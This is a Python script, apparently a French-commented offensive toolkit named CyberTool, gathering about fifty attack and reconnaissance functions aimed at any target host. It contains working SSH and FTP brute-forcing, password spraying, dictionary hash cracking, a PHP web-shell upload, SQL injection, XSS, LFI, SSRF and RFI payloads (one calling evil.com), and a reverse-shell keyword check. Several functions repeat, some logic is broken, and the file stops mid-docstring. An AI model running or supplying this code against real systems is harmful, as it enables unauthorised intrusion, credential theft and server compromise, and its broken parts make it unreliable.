#!/usr/bin/env python3


# üìå Modules Essentiels du Syst√®me
import os
import sys
import time
import random
import socket
import hashlib
import json
import re
import base64  # Encodage/D√©codage
import subprocess  # Ex√©cution de commandes syst√®mes
import zipfile  # Manipulation de fichiers compress√©s
import threading  # Multithreading pour les scans rapides
import ssl  # Analyse TLS
import shutil  # Gestion des fichiers
import logging  # Gestion avanc√©e des logs
import argparse  # Gestion des arguments en ligne de commande
from datetime import datetime  # Gestion des timestamps
from urllib.parse import urlparse  # ‚úÖ G√®re les URLs

# üìå Modules de Pentesting & Cybers√©curit√©
import dns.resolver  # Recherche DNS
from Cryptodome.Cipher import AES  # Chiffrement
from bs4 import BeautifulSoup  # Scraping Web
import requests  # Requ√™tes HTTP
import jwt  # Manipulation JSON Web Tokens
import concurrent.futures  # ‚úÖ Multithreading (port scan, bruteforce, etc.)

# üìå Modules R√©seau et Protocoles
import scapy.config
scapy.config.conf.use_pcap = True  # ‚úÖ √âvite les erreurs de permissions sous Termux
from scapy.all import sniff, IP, TCP, UDP  # Analyse R√©seau
from smbprotocol.connection import Connection  # ‚úÖ Connexion SMB via smbprotocol (Termux compatible)
from ftplib import FTP  # Connexion FTP

# üìå Modules d'Interaction & Affichage Dynamique
from rich.console import Console
from rich.panel import Panel
from rich.progress import Progress, BarColumn, TimeElapsedColumn, TextColumn, SpinnerColumn
from rich.table import Table
from rich.prompt import Confirm, Prompt

# üìå Modules de Traitement d'Images et de Donn√©es
from PIL import Image  # ‚úÖ Extraction de m√©tadonn√©es d‚Äôimages
from io import BytesIO  # ‚úÖ Gestion des flux binaires (images, fichiers, etc.)

# üìå Configuration du Logging
logging.basicConfig(
    format="%(asctime)s - [%(levelname)s] %(message)s",
    level=logging.INFO,
    handlers=[
        logging.StreamHandler(sys.stdout),  # Affiche les logs dans le terminal
    ],
)

# üìå Console Globale pour un Affichage Propre
console = Console()

# üìå Bruteforce SSH avec pexpect (remplace paramiko)
import pexpect  # ‚úÖ G√®re les connexions SSH sans paramiko








class CyberTool:
    def __init__(self):
        """üî• Initialisation de CyberTool avec ses fonctionnalit√©s"""
        self.console = console
        self.results = {}

        # üî• Chargement des fonctionnalit√©s
        self.init_features()

    def init_features(self):
        """üöÄ Initialise la liste des fonctionnalit√©s"""
        self.feature_map = {
            "dns_lookup": "R√©solution DNS",
            "port_scan": "Scan des ports",
            "headers_analysis": "Analyse des headers HTTP",
            "directory_bruteforce": "Brute-force de r√©pertoires",
            "cms_detector": "D√©tection CMS",
            "exploit_cve_scanner": "Scan des vuln√©rabilit√©s CVE",
            "code_execution_testing": "Test d'ex√©cution de code",
            "cloud_storage_enum": "√ânum√©ration Cloud (AWS, GCP, Azure)",
            "smart_contract_audit": "Audit de contrats intelligents",
            "network_traffic_analysis": "Analyse du trafic r√©seau",
            "subdomain_enum": "√ânum√©ration des sous-domaines",
            "sql_injection_test": "Test d'injection SQL",
            "xss_scanner": "D√©tection de Cross-Site Scripting (XSS)",
            "csrf_detection": "D√©tection de Cross-Site Request Forgery (CSRF)",
            "lfi_scanner": "D√©tection de Local File Inclusion (LFI)",
            "rfi_scanner": "D√©tection de Remote File Inclusion (RFI)",
            "ssrf_scanner": "D√©tection de Server-Side Request Forgery (SSRF)",
            "jwt_analysis": "Analyse et d√©codage JWT",
            "exposed_api_scan": "Scan des API expos√©es",
            "honeypot_detection": "D√©tection de Honeypot",
            "open_redirect_test": "D√©tection d'Open Redirect",
            "sensitive_data_exposure": "D√©tection d'exposition de donn√©es sensibles",
            "metadata_extraction": "Extraction de m√©tadonn√©es",
            "user_enum": "√ânum√©ration d'utilisateurs",
            "php_eval_detection": "D√©tection d'ex√©cution de code PHP",
            "tls_analysis": "Analyse TLS et certificats",
            "dns_takeover_test": "Test de prise de contr√¥le DNS",
            "ssh_bruteforce": "Bruteforce SSH",
            "ftp_bruteforce": "Bruteforce FTP",
            "docker_registry_scan": "Scan de registre Docker",
            "password_spray": "Attaque Password Spraying",
            "api_rate_limit_test": "Test de limitations d‚ÄôAPI",
            "browser_fingerprint": "Fingerprinting Navigateur",
            "hidden_service_finder": "Recherche de services cach√©s",
            "iot_vulnerability_scan": "Scan de vuln√©rabilit√©s IoT",
            "cdn_detection": "D√©tection de CDN",
            "websocket_scan": "Scan des WebSockets",
            "reverse_shell_check": "D√©tection de reverse shell",
            "waf_detection": "D√©tection de pare-feu WAF",
            "file_upload_test": "Test de t√©l√©versement de fichiers",
            "kubernetes_enum": "√ânum√©ration Kubernetes",
            "cloudflare_bypass": "Bypass de Cloudflare",
            "web_fingerprint": "Fingerprinting Web",
            "password_cracking": "Craquage de mots de passe",
            "smb_enum": "√ânum√©ration SMB",
            "ftp_anonymous_login": "Connexion FTP anonyme",
            "nfs_enum": "√ânum√©ration des exports NFS",
            "vhost_scanner": "Scan des h√¥tes virtuels",
            "proxy_detection": "D√©tection de serveur proxy",
            "honeypot_advanced_detection": "D√©tection avanc√©e de Honeypots"
        }








    def dns_lookup(self, target):
        """üì° R√©solution DNS avec gestion des erreurs"""
        try:
            ip = socket.gethostbyname(target)
            return {"target": target, "resolved_ip": ip}
        except socket.gaierror:
            return {"error": "Erreur de r√©solution DNS"}

    def port_scan(self, target, ports=[21, 22, 80, 443, 3306], threads=10):
        """üîç Scan des ports avec multithreading"""
        def check_port(port):
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(1)
            result = s.connect_ex((target, port))
            s.close()
            return port if result == 0 else None

        with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as executor:
            open_ports = list(filter(None, executor.map(check_port, ports)))

        return {"target": target, "open_ports": open_ports} if open_ports else {"target": target, "open_ports": "Aucun port ouvert d√©tect√©"}


    def headers_analysis(self, target):
        """üõ†Ô∏è Analyse compl√®te des headers HTTP
        Retourne une r√©ponse d√©taill√©e incluant le statut, tous les headers et un √©chantillon du contenu.
        """
        # Correction de l'URL si n√©cessaire
        if not target.startswith("http"):
            url = f"http://{target}"
        else:
            url = target

        try:
            response = requests.get(url, timeout=5)
            headers = dict(response.headers)
            content_sample = response.text[:1000]  # √âchantillon de 1000 caract√®res du contenu

            self.console.print(f"\nüîç [bold cyan]Analyse compl√®te des headers de :[/bold cyan] {url}")
            self.console.print(f"[bold yellow]Statut HTTP :[/bold yellow] {response.status_code}")
            self.console.print(f"[bold green]Nombre de headers :[/bold green] {len(headers)}")
            
            return {
                "url": url,
                "status_code": response.status_code,
                "headers": headers,
                "content_sample": content_sample
            }
        except requests.RequestException as e:
            return {"error": f"Erreur lors de l'analyse compl√®te des headers: {str(e)}"}




    def directory_bruteforce(self, target, wordlist=None):
        """üö™ Brute-force de r√©pertoires"""
        if not wordlist:
            wordlist = ["admin", "login", "dashboard", "config", "backup"]

        found_dirs = []
        with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
            results = executor.map(lambda w: (w, self.get_http_response(f"http://{target}/{w}/")["status"]), wordlist)
            for word, status in results:
                if status == 200:
                    found_dirs.append(f"http://{target}/{word}/")

        return {"target": target, "found_directories": found_dirs} if found_dirs else {"target": target, "found_directories": "Aucun r√©pertoire trouv√©"}

    def cms_detector(self, target):
        """üñ•Ô∏è D√©tection CMS optimis√©e"""
        url = f"http://{target}"
        response_data = self.get_http_response(url)
        if "error" in response_data:
            return response_data

        content = response_data["content"].lower()
        headers = response_data["headers"]

        cms_signatures = {
            "WordPress": ["wp-content", "wp-includes", "wordpress"],
            "Drupal": ["drupal.js", "sites/all/modules"],
            "Joomla": ["Joomla!", "com_content"]
        }

        detected_cms = [name for name, signs in cms_signatures.items() if any(s in content or s in headers for s in signs)]
        return {"target": target, "cms_detected": detected_cms} if detected_cms else {"target": target, "cms_detected": "Aucun CMS d√©tect√©"}

    def exploit_cve_scanner(self, target):
        """‚ö†Ô∏è Scan des vuln√©rabilit√©s CVE"""
        url = f"https://cve.circl.lu/api/search/{target}"
        return self.get_http_response(url)

    def cloud_storage_enum(self, target):
        """‚òÅÔ∏è √ânum√©ration Cloud (AWS, GCP, Azure)"""
        buckets = [
            f"http://{target}.s3.amazonaws.com",
            f"http://{target}.blob.core.windows.net",
            f"http://{target}.storage.googleapis.com"
        ]
        available_buckets = []
        for bucket in buckets:
            response_data = self.get_http_response(bucket)
            if response_data.get("status") in [200, 403]:
                available_buckets.append({"bucket": bucket, "status": response_data["status"]})
        return {"target": target, "cloud_buckets": available_buckets} if available_buckets else {"target": target, "cloud_buckets": "Aucun stockage Cloud d√©tect√©"}

    def smart_contract_audit(self, target):
        """üìú Audit de contrats intelligents via l'API Etherscan"""
        etherscan_api = "https://api.etherscan.io/api"
        url = f"{etherscan_api}?module=contract&action=getsourcecode&address={target}"
        return self.get_http_response(url)

    def xss_scanner(self, target):
        """üíÄ D√©tection de Cross-Site Scripting (XSS)"""
        payloads = ["<script>alert(1)</script>", "'><img src=x onerror=alert(1)>"]
        results = {}
        for payload in payloads:
            url = f"http://{target}?q={payload}"
            response_data = self.get_http_response(url)
            if payload in response_data.get("content", ""):
                results[payload] = "Potentielle vuln√©rabilit√© XSS d√©tect√©e"
        return {"target": target, "xss_vulnerabilities": results} if results else {"target": target, "xss_vulnerabilities": "Aucune vuln√©rabilit√© XSS d√©tect√©e"}

    def subdomain_enum(self, target, wordlist=None):
        """üîé √ânum√©ration des sous-domaines"""
        if not wordlist:
            wordlist = ["www", "mail", "ftp", "api", "dev", "blog"]
        subdomains = []
        for sub in wordlist:
            subdomain = f"{sub}.{target}"
            try:
                socket.gethostbyname(subdomain)
                subdomains.append(subdomain)
            except socket.gaierror:
                pass
        return {"target": target, "subdomains": subdomains} if subdomains else {"target": target, "subdomains": "Aucun sous-domaine trouv√©"}



    def sql_injection_test(self, target):
        """üõë Test basique d'injection SQL"""
        payloads = ["' OR '1'='1", "' UNION SELECT 1,2,3--"]
        results = {}
        for payload in payloads:
            url = f"http://{target}?id={payload}"
            response_data = self.get_http_response(url)
            content = response_data.get("content", "").lower()
            if "error" not in response_data and ("error" in content or "syntax" in content):
                results[payload] = "Potentielle vuln√©rabilit√© d√©tect√©e"
        return {"target": target, "sql_injection": results} if results else {"target": target, "sql_injection": "Aucune vuln√©rabilit√© d√©tect√©e"}

    def csrf_detection(self, target):
        """üõ°Ô∏è D√©tection de Cross-Site Request Forgery (CSRF)"""
        url = f"http://{target}"
        response_data = self.get_http_response(url)
        if "error" in response_data:
            return response_data
        soup = BeautifulSoup(response_data.get("content", ""), "html.parser")
        forms = soup.find_all("form")
        csrf_protected = any("csrf" in str(form).lower() for form in forms)
        return {"target": target, "csrf_protected": csrf_protected}

    def lfi_scanner(self, target):
        """üìÇ D√©tection de Local File Inclusion (LFI)"""
        payloads = ["../../../../etc/passwd", "../../../../windows/win.ini"]
        results = {}
        for payload in payloads:
            url = f"http://{target}/index.php?file={payload}"
            response_data = self.get_http_response(url)
            content = response_data.get("content", "")
            if "root:x" in content or "for 16-bit app support" in content:
                results[payload] = "Potentielle vuln√©rabilit√© LFI d√©tect√©e"
        return {"target": target, "lfi_vulnerabilities": results} if results else {"target": target, "lfi_vulnerabilities": "Aucune vuln√©rabilit√© d√©tect√©e"}

    def rfi_scanner(self, target):
        """üåç D√©tection de Remote File Inclusion (RFI)"""
        payloads = ["http://evil.com/shell.txt", "https://raw.githubusercontent.com/malicious/script.php"]
        results = {}
        for payload in payloads:
            url = f"http://{target}/index.php?file={payload}"
            response_data = self.get_http_response(url)
            content = response_data.get("content", "").lower()
            if "malicious" in content or "shell" in content:
                results[payload] = "Potentielle vuln√©rabilit√© RFI d√©tect√©e"
        return {"target": target, "rfi_vulnerabilities": results} if results else {"target": target, "rfi_vulnerabilities": "Aucune vuln√©rabilit√© d√©tect√©e"}

    def ssrf_scanner(self, target):
        """üåê D√©tection de Server-Side Request Forgery (SSRF)"""
        payloads = ["http://127.0.0.1:80", "http://169.254.169.254/latest/meta-data"]
        results = {}
        for payload in payloads:
            url = f"http://{target}/proxy?url={payload}"
            response_data = self.get_http_response(url)
            if response_data.get("status") == 200:
                results[payload] = "Potentielle vuln√©rabilit√© SSRF d√©tect√©e"
        return {"target": target, "ssrf_vulnerabilities": results} if results else {"target": target, "ssrf_vulnerabilities": "Aucune vuln√©rabilit√© d√©tect√©e"}

    def jwt_analysis(self, jwt_token):
        """üîë Analyse et d√©codage JWT"""
        try:
            decoded = jwt.decode(jwt_token, options={"verify_signature": False})
            return {"jwt_token": jwt_token, "decoded_payload": decoded}
        except jwt.DecodeError:
            return {"error": "JWT invalide"}

    def exposed_api_scan(self, target):
        """üõ†Ô∏è Scan des API expos√©es"""
        endpoints = ["/api/v1/status", "/api/v1/users", "/api/v1/admin"]
        results = {}
        for endpoint in endpoints:
            url = f"http://{target}{endpoint}"
            response_data = self.get_http_response(url)
            if response_data.get("status") == 200:
                results[endpoint] = "Endpoint accessible"
        return {"target": target, "exposed_api_endpoints": results} if results else {"target": target, "exposed_api_endpoints": "Aucun endpoint expos√©"}

    def open_redirect_test(self, target):
        """üîÑ D√©tection d'Open Redirect"""
        payloads = ["/redirect?url=https://evil.com", "/goto?target=https://evil.com"]
        results = {}
        for payload in payloads:
            url = f"http://{target}{payload}"
            response_data = self.get_http_response(url)
            # Ici, on v√©rifie si "evil.com" est pr√©sent dans le contenu (cas simplifi√©)
            if "evil.com" in response_data.get("content", "").lower():
                results[payload] = "Potentielle vuln√©rabilit√© d√©tect√©e"
        return {"target": target, "open_redirects": results} if results else {"target": target, "open_redirects": "Aucune vuln√©rabilit√© d√©tect√©e"}

    def sensitive_data_exposure(self, target):
        """üîì D√©tection d'exposition de donn√©es sensibles"""
        patterns = {
            "API Keys": r"(?i)api[_-]?key\s*=\s*[\"'][a-zA-Z0-9]+[\"']",
            "Token JWT": r"eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+",
            "Emails": r"[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}"
        }
        results = {}
        url = f"http://{target}"
        response_data = self.get_http_response(url)
        content = response_data.get("content", "")
        for name, pattern in patterns.items():
            found = re.findall(pattern, content)
            if found:
                results[name] = found
        return {"target": target, "sensitive_data": results} if results else {"target": target, "sensitive_data": "Aucune donn√©e sensible trouv√©e"}

    def metadata_extraction(self, target):
        """üì∏ Extraction de m√©tadonn√©es d'images"""
        url = f"http://{target}/image.jpg"
        response_data = self.get_http_response(url)
        if "error" in response_data:
            return response_data
        try:
            img = Image.open(BytesIO(response_data.get("content", "").encode()))
            return {"target": target, "metadata": img.info}
        except Exception as e:
            return {"error": f"Impossible d'extraire les m√©tadonn√©es : {str(e)}"}




    def code_execution_testing(self, target, payload={"cmd": "whoami"}):
        """üíª Test d'ex√©cution de code via POST"""
        url = f"http://{target}/cmd_exec"
        response_data = self.get_http_response(url, method="POST", data=payload)
        if "error" in response_data:
            return response_data
        return {"target": target, "execution_output": response_data.get("content", "")}

    def network_traffic_analysis(self, interface="eth0", packet_count=10):
        """üìä Analyse du trafic r√©seau avec capture des paquets"""
        try:
            packets = sniff(iface=interface, count=packet_count, timeout=5)
            summaries = [pkt.summary() for pkt in packets]
            return {"interface": interface, "captured_packets": summaries}
        except Exception as e:
            return {"error": f"Impossible de capturer le trafic r√©seau sur {interface} : {e}"}

    def honeypot_detection(self, target):
        """üêù D√©tection de Honeypot via analyse comportementale"""
        url = f"http://{target}"
        headers = {"User-Agent": "MaliciousScanner"}
        response_data = self.get_http_response(url, headers=headers)
        if "error" in response_data:
            return response_data
        if "you have been detected" in response_data.get("content", "").lower() or response_data.get("status") in [403, 429]:
            return {"target": target, "honeypot_detected": True}
        return {"target": target, "honeypot_detected": False}

    def user_enum(self, target):
        """üë• √ânum√©ration d'utilisateurs via messages d'erreur"""
        usernames = ["admin", "user", "test", "root"]
        results = {}
        for user in usernames:
            url = f"http://{target}/login"
            response_data = self.get_http_response(url, method="POST", data={"username": user, "password": "test"})
            content = response_data.get("content", "").lower()
            if "invalid password" in content:
                results[user] = "Utilisateur existant"
        return {"target": target, "user_enumeration": results} if results else {"target": target, "user_enumeration": "Aucune √©num√©ration possible"}

    def php_eval_detection(self, target):
        """üêò D√©tection d'ex√©cution de code PHP via eval()"""
        payloads = ["phpinfo();", "system('id');"]
        results = {}
        for payload in payloads:
            url = f"http://{target}/eval.php"
            response_data = self.get_http_response(url, method="POST", data={"code": payload})
            content = response_data.get("content", "").lower()
            if "uid=" in content or "phpinfo()" in content:
                results[payload] = "Potentielle vuln√©rabilit√© d√©tect√©e"
        return {"target": target, "php_eval_vulnerabilities": results} if results else {"target": target, "php_eval_vulnerabilities": "Aucune vuln√©rabilit√© d√©tect√©e"}

    def tls_analysis(self, target):
        """üîê Analyse des certificats SSL/TLS"""
        try:
            conn = socket.create_connection((target, 443))
            context = ssl.create_default_context()
            with context.wrap_socket(conn, server_hostname=target) as s:
                cert = s.getpeercert()
            return {"target": target, "tls_cert": cert}
        except Exception as e:
            return {"error": f"Impossible d'obtenir le certificat TLS : {e}"}

    def dns_takeover_test(self, target):
        """üåç Test de prise de contr√¥le DNS via sous-domaines orphelins"""
        subdomains = ["cdn", "files", "old", "beta"]
        takeover_risks = {}
        for sub in subdomains:
            try:
                resolved_ip = socket.gethostbyname(f"{sub}.{target}")
                # V√©rification simple sur la pr√©sence de cha√Ænes cl√©s
                if "aws" in resolved_ip.lower() or "cloudflare" in resolved_ip.lower():
                    takeover_risks[sub] = "Potentiel risque de takeover"
            except socket.gaierror:
                continue
        return {"target": target, "dns_takeover": takeover_risks} if takeover_risks else {"target": target, "dns_takeover": "Aucun risque d√©tect√©"}

    def ssh_bruteforce(self, target, username="root", passwords=None):
        """üîë Bruteforce SSH basique avec pexpect"""
        if not passwords:
            passwords = ["admin", "root", "password", "123456"]
        import pexpect
        for password in passwords:
            try:
                child = pexpect.spawn(f"ssh {username}@{target}", timeout=5)
                child.expect("password:", timeout=5)
                child.sendline(password)
                idx = child.expect(["#", "Permission denied"], timeout=5)
                child.close()
                if idx == 0:
                    return {"target": target, "ssh_success": f"Connexion r√©ussie avec {password}"}
            except (pexpect.exceptions.TIMEOUT, pexpect.exceptions.EOF):
                continue
        return {"target": target, "ssh_success": "Aucune connexion r√©ussie"}

    def ftp_bruteforce(self, target, username="anonymous", passwords=None):
        """üì° Bruteforce FTP basique"""
        from ftplib import FTP
        if not passwords:
            passwords = ["admin", "ftp", "123456", "password"]
        for password in passwords:
            try:
                ftp = FTP(target, timeout=5)
                ftp.login(username, password)
                ftp.quit()
                return {"target": target, "ftp_success": f"Connexion r√©ussie avec {password}"}
            except Exception:
                continue
        return {"target": target, "ftp_success": "Aucune connexion r√©ussie"}

    def docker_registry_scan(self, target):
        """üê≥ Scan des registres Docker expos√©s"""
        endpoints = ["/v2/", "/v2/_catalog", "/v2/repositories"]
        results = {}
        for endpoint in endpoints:
            url = f"http://{target}{endpoint}"
            response_data = self.get_http_response(url)
            if response_data.get("status") == 200:
                results[endpoint] = "Registre accessible"
        return {"target": target, "docker_registry": results} if results else {"target": target, "docker_registry": "Aucun registre expos√© d√©tect√©"}



    def password_spray(self, target, usernames=None, password="password123"):
        """üîë Attaque Password Spraying sur plusieurs utilisateurs"""
        if not usernames:
            usernames = ["admin", "user", "test", "root"]
        results = {}
        for user in usernames:
            url = f"http://{target}/login"
            response_data = self.get_http_response(url, method="POST", data={"username": user, "password": password})
            content = response_data.get("content", "").lower()
            if "invalid password" not in content:
                results[user] = "Acc√®s possible avec ce mot de passe"
        return {"target": target, "password_spray": results} if results else {"target": target, "password_spray": "Aucune connexion r√©ussie"}

    def api_rate_limit_test(self, target, endpoint="/api/v1/status", requests_count=50):
        """üìä Test de limitations d‚ÄôAPI en envoyant un grand nombre de requ√™tes"""
        success_count = 0
        for _ in range(requests_count):
            url = f"http://{target}{endpoint}"
            response_data = self.get_http_response(url)
            if response_data.get("status") == 200:
                success_count += 1
        return {"target": target, "api_rate_limit_test": {"requests_sent": requests_count, "successful_requests": success_count}}

    def browser_fingerprint(self):
        """üñ•Ô∏è G√©n√©ration d'une empreinte navigateur unique"""
        import platform, uuid
        return {
            "os": platform.system(),
            "os_version": platform.release(),
            "fingerprint": str(uuid.uuid4())
        }

    def hidden_service_finder(self, target):
        """üîé Recherche de services cach√©s sur un serveur"""
        ports = [22, 80, 443, 8080, 8443]
        found_services = []
        for port in ports:
            try:
                socket.create_connection((target, port), timeout=2)
                found_services.append(port)
            except Exception:
                continue
        return {"target": target, "hidden_service_finder": found_services} if found_services else {"target": target, "hidden_service_finder": "Aucun service d√©tect√©"}




    def iot_vulnerability_scan(self, target):
        """üì° Scan des vuln√©rabilit√©s IoT avec d√©tection des ports ouverts et versions"""
        ports = [23, 80, 443, 554, 8080]
        results = {}
        for port in ports:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(2)
                s.connect((target, port))
                banner = s.recv(1024).decode().strip()
                results[port] = banner
                s.close()
            except:
                continue
        return {"target": target, "iot_vulnerabilities": results} if results else {"target": target, "iot_vulnerabilities": "Aucune vuln√©rabilit√© d√©tect√©e"}





    def cdn_detection(self, target):
        """üåê D√©tection de CDN en analysant les headers de r√©ponse"""
        url = f"http://{target}"
        response_data = self.get_http_response(url)
        cdn_providers = ["Cloudflare", "Akamai", "Fastly", "Amazon CloudFront"]
        detected = [cdn for cdn in cdn_providers if any(cdn.lower() in v.lower() for v in response_data.get("headers", {}).values())]
        return {"target": target, "cdn_detected": detected} if detected else {"target": target, "cdn_detected": "Aucun CDN d√©tect√©"}

    def websocket_scan(self, target):
        """üîó Scan des WebSockets accessibles"""
        url = f"http://{target}"
        response_data = self.get_http_response(url)
        headers = response_data.get("headers", {})
        if "Upgrade" in headers and "websocket" in headers.get("Upgrade", "").lower():
            return {"target": target, "websocket": "WebSocket d√©tect√©"}
        return {"target": target, "websocket": "Aucun WebSocket d√©tect√©"}

    def reverse_shell_check(self, target):
        """üîÑ D√©tection de reverse shell sur un serveur"""
        url = f"http://{target}/shell.php"
        response_data = self.get_http_response(url)
        content = response_data.get("content", "").lower()
        if "nc -e" in content or "bash -i" in content:
            return {"target": target, "reverse_shell": "Pr√©sence d'un reverse shell"}
        return {"target": target, "reverse_shell": "Aucun reverse shell d√©tect√©"}

    def waf_detection(self, target):
        """üõ°Ô∏è D√©tection de pare-feu WAF en envoyant des requ√™tes suspectes"""
        payloads = ["<script>alert(1)</script>", "' OR '1'='1"]
        results = {}
        for payload in payloads:
            url = f"http://{target}?q={payload}"
            response_data = self.get_http_response(url)
            if response_data.get("status") in [403, 406, 500]:
                results[payload] = "Possibilit√© d'un WAF"
        return {"target": target, "waf_detected": results} if results else {"target": target, "waf_detected": "Aucun WAF d√©tect√©"}

    def file_upload_test(self, target):
        """üì§ Test de t√©l√©versement de fichiers dangereux"""
        url = f"http://{target}/upload"
        files = {"file": ("test.php", "<?php system('whoami'); ?>", "application/x-php")}
        response_data = self.get_http_response(url, method="POST", data=None, files=files)
        if response_data.get("status") == 200:
            return {"target": target, "upload_test": "T√©l√©versement r√©ussi"}
        return {"target": target, "upload_test": "T√©l√©versement √©chou√©"}

    def kubernetes_enum(self, target):
        """‚ò∏Ô∏è √ânum√©ration des clusters Kubernetes expos√©s"""
        endpoints = ["/api", "/api/v1/nodes", "/api/v1/pods"]
        results = {}
        for endpoint in endpoints:
            url = f"http://{target}{endpoint}"
            response_data = self.get_http_response(url)
            if response_data.get("status") == 200:
                results[endpoint] = "Accessible"
        return {"target": target, "kubernetes_exposed": results} if results else {"target": target, "kubernetes_exposed": "Aucun endpoint d√©tect√©"}

    def cloudflare_bypass(self, target):
        """‚òÅÔ∏è Bypass Cloudflare en testant des sous-domaines directs"""
        subdomains = ["direct", "origin", "backend", "server"]
        found = []
        for sub in subdomains:
            try:
                ip = socket.gethostbyname(f"{sub}.{target}")
                found.append(f"{sub}.{target} -> {ip}")
            except socket.gaierror:
                continue
        return {"target": target, "cloudflare_bypass": found} if found else {"target": target, "cloudflare_bypass": "√âchec du contournement"}

    def web_fingerprint(self, target):
        """üïµÔ∏è‚Äç‚ôÇÔ∏è Fingerprinting Web en analysant les headers et le contenu"""
        url = f"http://{target}"
        response_data = self.get_http_response(url)
        headers = response_data.get("headers", {})
        technologies = []
        if "server" in headers:
            technologies.append(f"Serveur: {headers['server']}")
        if "x-powered-by" in headers:
            technologies.append(f"Powered by: {headers['x-powered-by']}")
        if "wp-content" in response_data.get("content", ""):
            technologies.append("CMS d√©tect√©: WordPress")
        return {"target": target, "web_fingerprint": technologies} if technologies else {"target": target, "web_fingerprint": "Aucune technologie identifi√©e"}

    def password_cracking(self, hash_value, hash_type="md5"):
        """üîì Craquage de hash basique avec dictionnaire"""
        wordlist = ["admin", "password", "123456", "letmein"]
        for word in wordlist:
            hashed_word = hashlib.new(hash_type, word.encode()).hexdigest()
            if hashed_word == hash_value:
                return {"hash_value": hash_value, "plaintext": word}
        return {"hash_value": hash_value, "plaintext": "Non trouv√©"}



    def smb_enum(self, target):
        """üìÇ √ânum√©ration des partages SMB accessibles"""
        try:
            from smbprotocol.connection import Connection
            import uuid
            conn = Connection(uuid.uuid4().hex, target)
            conn.connect()
            shares = conn.list_shares()
            return {"target": target, "smb_shares": [s.name for s in shares]}
        except Exception as e:
            return {"error": f"Impossible de se connecter au SMB : {e}"}

    def ftp_anonymous_login(self, target):
        """üåê Test de connexion FTP anonyme"""
        try:
            from ftplib import FTP
            ftp = FTP(target, timeout=5)
            ftp.login("anonymous", "anonymous")
            ftp.quit()
            return {"target": target, "ftp_anonymous": "Connexion anonyme r√©ussie"}
        except Exception as e:
            return {"target": target, "ftp_anonymous": f"Connexion anonyme impossible : {e}"}

    def nfs_enum(self, target):
        """üìÅ √ânum√©ration des exports NFS accessibles"""
        url = f"http://{target}/rpc/nfs/export"
        response_data = self.get_http_response(url)
        if "error" not in response_data and response_data.get("status") == 200:
            return {"target": target, "nfs_exports": response_data.get("content", "Inconnu")}
        else:
            return {"error": "Impossible d'√©num√©rer les exports NFS"}

    def vhost_scanner(self, target, wordlist=None):
        """üîç Scan des h√¥tes virtuels en testant plusieurs noms courants"""
        if not wordlist:
            wordlist = ["dev", "staging", "test", "api"]
        found = []
        for sub in wordlist:
            try:
                ip = socket.gethostbyname(f"{sub}.{target}")
                found.append(f"{sub}.{target} -> {ip}")
            except socket.gaierror:
                continue
        return {"target": target, "vhosts": found} if found else {"target": target, "vhosts": "Aucun vhost d√©tect√©"}

    def proxy_detection(self, target):
        """üõ°Ô∏è D√©tection de serveur proxy via headers HTTP"""
        url = f"http://{target}"
        response_data = self.get_http_response(url)
        if "error" in response_data:
            return response_data
        proxy_headers = ["via", "x-forwarded-for", "x-proxy-id"]
        proxies = [h for h in proxy_headers if h in response_data.get("headers", {})]
        return {"target": target, "proxy_detected": proxies} if proxies else {"target": target, "proxy_detected": "Aucun proxy d√©tect√©"}

    def honeypot_advanced_detection(self, target):
        """üêù D√©tection avanc√©e de Honeypots via analyse comportementale"""
        url = f"http://{target}"
        headers = {"User-Agent": "MaliciousScanner"}
        response_data = self.get_http_response(url, headers=headers)
        if "error" in response_data:
            return response_data
        if "you have been detected" in response_data.get("content", "").lower() or response_data.get("status") in [403, 429]:
            return {"target": target, "honeypot_detected": "Pr√©sence probable d'un honeypot"}
        return {"target": target, "honeypot_detected": "Pas de honeypot d√©tect√©"}

    def user_enum(self, target):
        """üë• √ânum√©ration d'utilisateurs via messages d'erreur"""
        usernames = ["admin", "user", "test", "root"]
        results = {}
        for user in usernames:
            url = f"http://{target}/login"
            response_data = self.get_http_response(url, method="POST", data={"username": user, "password": "test"})
            if "invalid password" in response_data.get("content", "").lower():
                results[user] = "Utilisateur existant"
        return {"target": target, "user_enumeration": results} if results else {"target": target, "user_enumeration": "Aucune √©num√©ration d√©tect√©e"}

    def php_eval_detection(self, target):
        """üêò D√©tection d'ex√©cution de code PHP via eval()"""
        payloads = ["phpinfo();", "system('id');"]
        results = {}
        for payload in payloads:
            url = f"http://{target}/eval.php"
            response_data = self.get_http_response(url, method="POST", data={"code": payload})
            content = response_data.get("content", "").lower()
            if "uid=" in content or "phpinfo()" in content:
                results[payload] = "Potentielle vuln√©rabilit√© d√©tect√©e"
        return {"target": target, "php_eval_vulnerabilities": results} if results else {"target": target, "php_eval_vulnerabilities": "Aucune vuln√©rabilit√© d√©tect√©e"}

    def tls_analysis(self, target):
        """üîê Analyse des certificats SSL/TLS d'un site"""
        try:
            conn = socket.create_connection((target, 443), timeout=5)
            context = ssl.create_default_context()
            with context.wrap_socket(conn, server_hostname=target) as s:
                cert = s.getpeercert()
            return {"target": target, "tls_cert": cert}
        except Exception as e:
            return {"error": f"Impossible d'obtenir le certificat TLS : {e}"}

    def dns_takeover_test(self, target):
        """üåç Test de prise de contr√¥le DNS via sous-domaines orphelins"""
        subdomains = ["cdn", "files", "old", "beta"]
        takeover_risks = {}
        for sub in subdomains:
            try:
                resolved_ip = socket.gethostbyname(f"{sub}.{target}")
                if "aws" in resolved_ip.lower() or "cloudflare" in resolved_ip.lower():
                    takeover_risks[sub] = "Potentiel risque de takeover"
            except socket.gaierror:
                continue
        return {"target": target, "dns_takeover": takeover_risks} if takeover_risks else {"target": target, "dns_takeover": "Aucun risque d√©tect√©"}






    def get_http_response(self, url, method="GET", headers=None, data=None, files=None, timeout=5):
        """üåê Effectue une requ√™te HTTP et retourne une r√©ponse format√©e.
        
        Param√®tres :
            url (str)      : L'URL √† interroger.
            method (str)   : M√©thode HTTP √† utiliser (GET, POST, etc.), par d√©faut "GET".
            headers (dict) : Dictionnaire des headers HTTP (optionnel).
            data (dict)    : Donn√©es √† envoyer dans le corps de la requ√™te (pour POST, etc.), optionnel.
            files (dict)   : Fichiers √† envoyer (optionnel).
